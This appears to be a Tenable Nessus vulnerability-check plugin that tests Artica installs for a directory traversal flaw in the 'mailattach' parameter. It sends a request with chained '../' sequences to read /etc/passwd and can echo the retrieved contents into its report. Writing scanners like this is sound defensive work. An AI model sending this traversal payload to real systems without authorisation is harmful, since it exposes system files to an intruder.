#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50325);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2014/08/09 00:11:21 $");

  script_bugtraq_id(43613);
  script_osvdb_id(68344);
  script_xref(name:"Secunia", value:"41675");

  script_name(english:"Artica mailattach Parameter Directory Traversal");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",value:
"The remote web server contains a web application that is susceptible
to a directory traversal attack." );
  script_set_attribute(
    attribute:"description",value:
"The installed version of Artica fails to sanitize user-supplied input
to the 'mailattach' parameter of the 'images.listener.php' scrip.  By
prefixing directory traversal strings such as '../' to the
'mailattach' parameter a remote, unauthenticated attacker could exploit
this vulnerability to read arbitrary files from the remote system.

Although Nessus has not checked for them, the installed version is
also likely to be affected by several other vulnerabilities, including
information disclosure, cross-site scripting, SQL injection and
directory traversal.");
   # http://web.archive.org/web/20100623011540/http://www.artica.fr/index.php/get-a-download-artica/nightly-builds
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?608c90db");
  script_set_attribute(attribute:"see_also", value:"http://www.artica.fr/forum/viewtopic.php?f=11&t=2734" );
  script_set_attribute(attribute:"solution", value:"Upgrade to Artica v1.4.092916 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/09/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2014 Tenable Network Security, Inc.");

  script_dependencies("artica_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 9000);
  script_require_keys("www/artica","www/lighttpd");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:9000);

install = get_install_from_kb(appname:'artica', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Artica is only available for *nix

file = '/etc/passwd';

url =  dir + '/images.listener.php?mailattach=' +
      crap(data:"../", length:3*5) + '..' +
      file ;

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

if (egrep(pattern:"root:.*:0:[01]:", string:res[2]))
{
  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);

    if (report_verbosity > 1)
    {
      report = report + '\n' +
        "Here are the contents : " + '\n\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
         res[2] + '\n' +
         crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;
    }
    security_hole(port:port, extra:report);
  }
   else security_hole(port);
   exit(0);
}
else
  exit(0, "The Artica install at " +  build_url(qs:dir, port:port) + " is not affected.");
